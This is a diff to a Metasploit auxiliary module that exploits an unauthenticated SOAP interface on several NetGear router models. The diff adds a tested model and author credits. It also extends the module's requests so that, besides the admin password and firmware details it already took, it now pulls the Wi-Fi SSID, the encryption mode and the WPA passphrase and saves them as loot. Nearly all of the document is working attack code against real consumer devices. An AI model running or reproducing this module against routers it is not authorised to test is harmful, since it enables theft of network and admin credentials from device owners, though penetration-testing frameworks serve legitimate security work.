@@ -5,7 +5,7 @@
 
 require 'msf/core'
 
-class Metasploit3 < Msf::Auxiliary
+class MetasploitModule < Msf::Auxiliary
 
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::Report
@@ -26,7 +26,8 @@ class Metasploit3 < Msf::Auxiliary
         NetGear WNDR3300 - V1.0.45 (Tested by Robert Mueller),
         NetGear WNDR3800 - V1.0.0.48 (Tested by an Anonymous contributor),
         NetGear WNR1000v2 - V1.0.1.1 (Tested by Jimi Sebree),
-        NetGear WNR1000v2 - V1.1.2.58 (Tested by Chris Boulton)
+        NetGear WNR1000v2 - V1.1.2.58 (Tested by Chris Boulton),
+        NetGear WNR2000v3 - v1.1.2.10 (Tested by h00die)
       },
       'References'  =>
         [
@@ -37,23 +38,35 @@ class Metasploit3 < Msf::Auxiliary
       'Author'      =>
         [
           'Peter Adkins <peter.adkins[at]kernelpicnic.net>', # Vulnerability discovery
-          'Michael Messner <devnull[at]s3cur1ty.de>'	     # Metasploit module
+          'Michael Messner <devnull[at]s3cur1ty.de>',	     # Metasploit module
+          'h00die <mike@shorebreaksecurity.com>'       # Metasploit enhancements/docs
         ],
-      'License'     => MSF_LICENSE
+      'License'     => MSF_LICENSE,
+      'DisclosureDate' => 'Feb 11 2015'
     )
   end
 
   def run
-    print_status("#{peer} - Trying to access the configuration of the device")
+    print_status("Trying to access the configuration of the device")
 
     # extract device details
     action = 'urn:NETGEAR-ROUTER:service:DeviceInfo:1#GetInfo'
-    print_status("#{peer} - Extracting Firmware version...")
+    print_status("Extracting Firmware version...")
     extract_data(action)
 
     # extract credentials
     action = 'urn:NETGEAR-ROUTER:service:LANConfigSecurity:1#GetInfo'
-    print_status("#{peer} - Extracting credentials...")
+    print_status("Extracting credentials...")
+    extract_data(action)
+
+    # extract wifi info
+    action = 'urn:NETGEAR-ROUTER:service:WLANConfiguration:1#GetInfo'
+    print_status("Extracting Wifi...")
+    extract_data(action)
+
+    # extract WPA info
+    action = 'urn:NETGEAR-ROUTER:service:WLANConfiguration:1#GetWPASecurityKeys'
+    print_status("Extracting WPA Keys...")
     extract_data(action)
   end
 
@@ -75,26 +88,41 @@ class Metasploit3 < Msf::Auxiliary
       return if res.headers['Server'] !~ /Linux\/2.6.15 uhttpd\/1.0.0 soap\/1.0/
 
       if res.body =~ /<NewPassword>(.*)<\/NewPassword>/
-        print_status("#{peer} - Credentials found, extracting...")
+        print_status("Credentials found, extracting...")
         extract_credentials(res.body)
       end
 
       if res.body =~ /<ModelName>(.*)<\/ModelName>/
         model_name = $1
-        print_good("#{peer} - Model #{model_name} found")
+        print_good("Model #{model_name} found")
       end
 
       if res.body =~ /<Firmwareversion>(.*)<\/Firmwareversion>/
         firmware_version = $1
-        print_good("#{peer} - Firmware version #{firmware_version} found")
+        print_good("Firmware version #{firmware_version} found")
 
         #store all details as loot
         loot = store_loot('netgear_soap_device.config', 'text/plain', rhost, res.body)
-        print_good("#{peer} - Device details downloaded to: #{loot}")
+        print_good("Device details downloaded to: #{loot}")
+      end
+
+      if res.body =~ /<NewSSID>(.*)<\/NewSSID>/
+        ssid = $1
+        print_good("Wifi SSID: #{ssid}")
+      end
+
+      if res.body =~ /<NewBasicEncryptionModes>(.*)<\/NewBasicEncryptionModes>/
+        wifi_encryption = $1
+        print_good("Wifi Encryption: #{wifi_encryption}")
+      end
+
+      if res.body =~ /<NewWPAPassphrase>(.*)<\/NewWPAPassphrase>/
+        wifi_password = $1
+        print_good("Wifi Password: #{wifi_password}")
       end
 
     rescue ::Rex::ConnectionError
-      vprint_error("#{peer} - Failed to connect to the web server")
+      vprint_error("Failed to connect to the web server")
       return
     end
   end
@@ -103,7 +131,7 @@ class Metasploit3 < Msf::Auxiliary
     body.each_line do |line|
       if line =~ /<NewPassword>(.*)<\/NewPassword>/
         pass = $1
-        print_good("#{peer} - admin / #{pass} credentials found")
+        print_good("admin / #{pass} credentials found")
 
         service_data = {
           address: rhost,
@@ -137,6 +165,6 @@ class Metasploit3 < Msf::Auxiliary
 
     # store all details as loot
     loot = store_loot('netgear_soap_account.config', 'text/plain', rhost, body)
-    print_good("#{peer} - Account details downloaded to: #{loot}")
+    print_good("Account details downloaded to: #{loot}")
   end
 end
